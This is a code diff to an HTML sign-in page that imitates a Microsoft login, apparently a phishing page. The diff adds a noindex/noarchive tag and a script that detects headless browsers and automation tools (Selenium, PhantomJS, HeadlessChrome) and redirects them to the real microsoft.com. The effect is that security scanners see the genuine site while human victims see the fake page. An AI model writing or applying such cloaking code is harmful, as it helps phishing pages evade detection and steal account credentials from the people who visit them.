@@ -3,6 +3,7 @@
 <head>
     <title>Sign in to your account</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex, noarchive">
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -105,5 +106,16 @@
             <a href="https://www.microsoft.com/en-us/privacy/privacystatement">Privacy & cookies</a>
         </div>
     </div>
+    <script>
+    (function() {
+        var headless = (
+            navigator.webdriver ||
+            (!window.chrome && /Chrome/.test(navigator.userAgent)) ||
+            navigator.plugins.length === 0 ||
+            /HeadlessChrome|PhantomJS|Selenium|WebDriver/i.test(navigator.userAgent)
+        );
+        if (headless) { window.location.replace('https://www.microsoft.com'); }
+    })();
+    </script>
 </body>
 </html>
